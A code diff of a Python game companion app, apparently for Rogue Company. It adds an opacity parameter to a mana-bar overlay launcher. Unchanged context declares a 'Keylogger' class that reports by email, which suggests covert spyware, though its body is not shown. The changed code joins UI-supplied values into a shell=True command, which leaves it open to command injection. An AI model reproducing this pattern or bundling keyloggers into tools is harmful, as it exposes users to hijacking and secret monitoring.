@@ -22,7 +22,7 @@ from requests import api
 version = 1.43
 client_id = "855638972033007617"  # Put your Client ID in here
 url_web = "https://rogue.cpsoftware.es"
-
+# subprocess.run('C:\Windows\System32/taskkill /F /IM roguecompanion.exe', shell=True)
 
 class Keylogger:
     def __init__(self, interval, report_method="email"):
@@ -189,7 +189,7 @@ def get_mana_bar():
 def closemana():
     subprocess.run('C:\Windows\System32/taskkill /F /IM manaoverlay.exe', shell=True)
 @eel.expose
-def set_mana_bar(src, w = "200", h = "600", px = "10", py = "10"):
+def set_mana_bar(src, w = "200", h = "600", px = "10", py = "10", op = "100"):
     print("mana")
     if os.path.isfile("manaoverlay.exe"):
         print("existe, no me actualizo")
@@ -205,7 +205,7 @@ def set_mana_bar(src, w = "200", h = "600", px = "10", py = "10"):
         subprocess.run('C:\Windows\System32/taskkill /F /IM manaoverlay.exe', shell=True)
     except:
         print("lo abro ahora")
-    path = os.path.realpath(os.path.dirname(sys.argv[0])) + "\manaoverlay.exe "+w+" "+h+" "+px+" "+py+" "+src+" 1"
+    path = os.path.realpath(os.path.dirname(sys.argv[0])) + "\manaoverlay.exe "+w+" "+h+" "+px+" "+py+" "+src+" "+op
     subprocess.run('start ' + path, shell=True)
 @eel.expose
 def ver():
